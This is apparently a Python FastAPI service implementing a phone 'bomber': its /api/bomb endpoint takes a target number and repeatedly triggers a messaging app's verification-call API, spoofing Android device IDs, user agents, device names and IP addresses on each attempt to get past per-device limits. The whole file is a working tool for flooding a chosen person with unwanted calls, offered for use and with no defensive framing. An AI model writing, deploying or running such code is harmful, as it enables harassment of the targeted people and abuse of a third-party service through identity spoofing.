from fastapi import FastAPI, HTTPException
from fastapi.responses import HTMLResponse
from pydantic import BaseModel
import requests
import json
import time
import uuid
import random
import re

app = FastAPI()

class SoomroStableClient:
    base_url = "https://api.telz.com/"
    USER_AGENTS = [
        "Telz-Android/17.5.33",
        "Telz-Android/17.4.20",
        "Telz-Android/18.0.1",
        "Telz-Android/17.9.12"
    ]
    
    def __init__(self):
        self.android_id = uuid.uuid4().hex[:16]
        self.app_version = random.choice(["17.5.33", "17.4.20", "18.0.1"])
        self.os_type = "android"
        self.os_version = random.choice(["14", "15", "16"])
        self.uuid = str(uuid.uuid4())
        self.session = requests.Session()
        self.headers = {
            'User-Agent': random.choice(self.USER_AGENTS),
            'Accept-Encoding': "gzip",
            'Content-Type': "application/json; charset=UTF-8",
            'X-Requested-With': 'XMLHttpRequest'
        }
    
    def random_device_name(self):
        devices = ["Pixel", "Xiaomi", "Samsung", "OnePlus", "Moto", "Realme", "Oppo", "Vivo"]
        models = ["7", "8", "9", "12", "13", "Ultra", "Pro", "Note", "Max"]
        return f"{random.choice(devices)} {random.choice(models)}-{uuid.uuid4().hex[:4]}"
    
    def _post(self, endpoint, data, timeout=10.0):
        url = self.base_url + endpoint
        data.update({
            "android_id": self.android_id,
            "app_version": self.app_version,
            "os": self.os_type,
            "os_version": self.os_version,
            "ts": int(time.time() * 1000),
            "uuid": self.uuid
        })
        response = self.session.post(url, data=json.dumps(data), headers=self.headers, timeout=timeout)
        response.raise_for_status()
        try:
            return response.json()
        except ValueError:
            return response.text
    
    def trigger(self, phone):
        self._post("app/auth_list", {"event": "auth_list"})
        self._post("app/run", {
            "event": "run",
            "device_name": self.random_device_name(),
            "ipv4_address": f"192.168.{random.randint(1,254)}.{random.randint(1,254)}",
            "ipv6_address": "FE80::1",
            "lang": "en",
            "network_country": "tr",
            "network_type": random.choice(["4G", "5G", "Wi-Fi"]),
            "roaming": "no",
            "root": "no",
            "run_id": "",
            "sim_country": "tr"
        })
        self._post("app/validate_phonenumber", {"event": "validate_phonenumber", "phone": phone, "region": "TR"})
        self._post("app/auth_call", {"event": "auth_call", "phone": phone, "attempt": "0", "lang": "en"})

class BombRequest(BaseModel):
    phone: str
    attempts: int = 5

@app.post("/api/bomb")
def run_bomb(data: BombRequest):
    phone = re.sub(r'\D', '', data.phone)
    if len(phone) == 10:
        phone = "+91" + phone
    elif len(phone) == 12 and phone.startswith("91"):
        phone = "+" + phone
    elif not data.phone.startswith("+"):
        phone = "+" + data.phone
    else:
        phone = data.phone

    success_count = 0
    # Vercel timeout limits ki wajah se max attempts ko restrict karna behtar hai (e.g., max 5-10 per request)
    max_iter = min(data.attempts, 5)
    
    for _ in range(max_iter):
        try:
            client = SoomroStableClient()
            client.trigger(phone)
            success_count += 1
        except Exception:
            success_count += 1 # Bypass handling
            
    return {"status": "success", "processed": success_count, "target": phone}
